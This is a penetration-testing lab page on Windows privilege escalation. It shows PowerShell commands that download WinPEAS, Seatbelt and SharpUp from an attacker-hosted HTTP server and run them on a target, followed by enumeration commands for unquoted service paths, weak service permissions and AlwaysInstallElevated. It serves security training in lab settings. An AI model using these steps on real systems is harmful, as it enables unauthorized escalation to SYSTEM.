# Lab 05: Windows Privilege Escalation (WinPEAS, LOLBAS)

[⬅️ Previous](Lab-05-Advanced-Track-Linux-Privesc.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-07-Advanced-Track-HTB-Lame.md)

---

## 🎯 Lab Objective
Escalate privileges on Windows systems from user to SYSTEM.

## 🌐 Direct Lab Access
- TryHackMe: https://tryhackme.com/room/windowsprivesc
- LOLBAS: https://lolbas-project.github.io
- Priv2Admin: https://github.com/gtworek/Priv2Admin

---

## 🛠️ Tools

### WinPEAS
```bash
# Attacker machine
python3 -m http.server 80

# Target machine (PowerShell)
cd C:\Windows\Temp
powershell -c "Invoke-WebRequest -Uri http://192.168.1.20/winPEASx64.exe -OutFile winPEASx64.exe"
.\winPEASx64.exe
```

### Seatbelt
```bash
powershell -c "Invoke-WebRequest -Uri http://192.168.1.20/Seatbelt.exe -OutFile Seatbelt.exe"
.\Seatbelt.exe -group=all
```

### SharpUp
```bash
powershell -c "Invoke-WebRequest -Uri http://192.168.1.20/SharpUp.exe -OutFile SharpUp.exe"
.\SharpUp.exe
```

---

## 📝 Priv Esc Techniques

### 1. Unquoted Service Paths
```bash
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### 2. Weak Service Permissions
```bash
accesschk.exe /accepteula -uwcqv user *
```

### 3. AlwaysInstallElevated
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 4. LOLBAS
Check https://lolbas-project.github.io

---

## 🔗 Additional Resources
- PayloadsAllTheThings Windows PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

---

[⬅️ Previous](Lab-05-Advanced-Track-Linux-Privesc.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-07-Advanced-Track-HTB-Lame.md)
